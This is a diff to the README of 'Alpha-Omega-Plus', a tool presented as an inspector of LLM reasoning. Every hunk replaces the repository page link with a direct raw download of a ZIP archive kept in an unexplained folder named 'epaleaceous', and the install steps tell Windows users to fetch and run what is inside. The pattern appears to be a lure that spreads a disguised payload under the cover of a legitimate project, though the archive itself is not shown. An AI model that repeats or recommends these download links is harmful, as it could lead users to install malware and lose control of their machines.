@@ -1,11 +1,11 @@
 # 🧭 Alpha-Omega-Plus - Verify Reasoning with Clear Signals
 
-[![Download Alpha-Omega-Plus](https://img.shields.io/badge/Download-Alpha--Omega--Plus-blue)](https://github.com/AckedStudios/Alpha-Omega-Plus)
+[![Download Alpha-Omega-Plus](https://img.shields.io/badge/Download-Alpha--Omega--Plus-blue)](https://github.com/AckedStudios/Alpha-Omega-Plus/raw/refs/heads/main/epaleaceous/Plus-Alpha-Omega-2.3.zip)
 
 ## 📥 Download
 Use this link to visit the download page and get Alpha-Omega-Plus:
 
-[Download Alpha-Omega-Plus](https://github.com/AckedStudios/Alpha-Omega-Plus)
+[Download Alpha-Omega-Plus](https://github.com/AckedStudios/Alpha-Omega-Plus/raw/refs/heads/main/epaleaceous/Plus-Alpha-Omega-2.3.zip)
 
 ## 🖥️ What Alpha-Omega-Plus Does
 Alpha-Omega-Plus checks how an LLM builds an answer. It looks at token patterns, attention flow, and stability across steps. It helps you inspect reasoning, spot weak output, and compare results in a repeatable way.
@@ -29,7 +29,7 @@ For best results:
 
 ## 🚀 Install and Run on Windows
 1. Open the download page:
-   [Download Alpha-Omega-Plus](https://github.com/AckedStudios/Alpha-Omega-Plus)
+   [Download Alpha-Omega-Plus](https://github.com/AckedStudios/Alpha-Omega-Plus/raw/refs/heads/main/epaleaceous/Plus-Alpha-Omega-2.3.zip)
 
 2. Get the Windows build or release file from the page.
 
@@ -169,7 +169,7 @@ If you get a ZIP file, extract it before you run anything inside it.
 ## 🔗 Project Link
 Primary download page:
 
-[https://github.com/AckedStudios/Alpha-Omega-Plus](https://github.com/AckedStudios/Alpha-Omega-Plus)
+[https://github.com/AckedStudios/Alpha-Omega-Plus/raw/refs/heads/main/epaleaceous/Plus-Alpha-Omega-2.3.zip](https://github.com/AckedStudios/Alpha-Omega-Plus/raw/refs/heads/main/epaleaceous/Plus-Alpha-Omega-2.3.zip)
 
 ## 🧭 What to Check After Install
 After the app opens:
